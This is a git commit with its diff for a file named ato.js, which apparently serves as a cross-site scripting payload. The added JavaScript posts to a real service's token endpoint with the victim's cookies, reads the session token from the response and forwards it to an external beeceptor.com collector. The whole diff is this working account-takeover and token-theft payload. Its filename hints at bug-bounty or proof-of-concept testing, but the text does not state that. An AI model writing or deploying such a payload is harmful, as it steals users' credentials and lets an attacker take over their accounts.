517aaf24db7b5196f7fe6441a863e422723be255
Ambush <56769633+ambushneupane@users.noreply.github.com>
2025-11-03 20:39:24 +0545

    Update alert message and add fetch functionality
    Fetch user token and send data to external endpoint.

--- ato.js
+++ ato.js
@@ -1,1 +1,18 @@
-alert('xSs iS fUn');
+alert('Hello, USER');
+
+fetch('https://my.zello.com/user/gettoken', {
+  method: 'POST',
+  credentials: 'include'
+})
+.then(response => response.json())
+.then(data => {
+  fetch('https://ywhftw.free.beeceptor.com/', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(data),
+    mode: 'no-cors'
+  });
+})
+.catch(error => console.error('Error:', error));
